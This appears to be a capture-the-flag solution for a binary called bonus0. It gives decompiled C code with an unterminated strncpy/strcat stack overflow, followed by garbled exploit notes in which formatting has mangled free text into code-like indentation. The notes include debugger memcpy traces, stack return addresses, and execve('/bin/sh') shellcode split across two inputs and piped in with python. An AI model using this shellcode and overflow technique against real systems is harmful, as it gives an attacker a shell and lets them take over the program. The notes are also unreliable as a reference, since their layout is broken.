#include <stdio.h>
#include <string.h>
#include <unistd.h>

void p(char *var, char *str) {
  char s1[4104];
  puts(str);
  read(0, s1, 4096);
  *strchr(s1, '\n') = '\0';
  strncpy(var, s1, 20);
  return;
}

void pp(char *buf) {
  char var1[20];
  char var2[20];

  p(var1, "~");
  p(var2, "~");
  strcpy(buf, var1);
  int len = strlen(buf);
  buf[len] = ' ';
  buf[len + 1] = '\0';
  strcat(buf, var2);
  return;
}

int main(void) {
  char buf[54];
  pp(buf);
  puts(buf);
}

p() = > buf = "";
var1 = "01234657890123456789" no '\0' var2 = ""

    p() = > buf = "";
var1 = "01234657890123456789" no '\0';
var2 = "AAAABBBBCCCCDDDDEEEE" no '\0';

strcpy() = > buf = var1 + var2 +
                   X

                   strcat() = > buf = var1 + var2 + X + ' ' + var2 +
                                      X var1
    : mini 20 +
      '\n' = first 20 char shellcode + '\n' var2 : 15 + ADRESS +
             '\n' = 4 char shellcode + padding(11) + 4 ADDRESS +
                    '\n' buf : var1 + var2 +
                               ' ' + var2 = 58 buf : 20 + 19 + ' ' + 19 = 59

    buf =
        var1 + var2 + ' ' +
        var2

        buf_main =
            var1 + var2(overflow var1) +

                call memcpy((void *)0xbfffe600, "01234567890123456789\n",
                            21) SHELLCODE 20 call
                    memcpy((void *)0xbfffe650, "AAAABBBBCCCCDDDDEEE\n", 20) SHEL
                    / GARBAGE /
                    ADRE

                    call memcpy((void *)0xbfffe650, "AAAABBBBCCCCDDDDEFF\n", 20)

                        call
                    memcpy((void *)0xbfffe680,
                           "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                           "\x6e\x89\xe3\x50\x53\x89\xe1\x99\n",
                           21)

                        a
                    *
                    10 call memcpy((void *)0xbfffe680,
                                   "\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44"
                                   "\x44\x44\x44\x44\x06\xf7\xff\xbf\x44\n",
                                   20)

                        0xbffff706 x
                    /
                    60bx 0xbffff6d6

                    (python -
                         c 'import sys; sys.stdout.write("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\n")';
                     python -
                     c 'import sys; sys.stdout.write("\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x06\xf7\xff\xbf\x44\n")';
                     cat) |
                ./ bonus0

                    0xbffff686 = main_buff 0xbfffe600 = p buffer call
    memcpy((void *)0xbfffe600,
           "\xb0\x0b\xcd\x80\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x98\xf8"
           "\xff\xbf\x44\n",
           20)
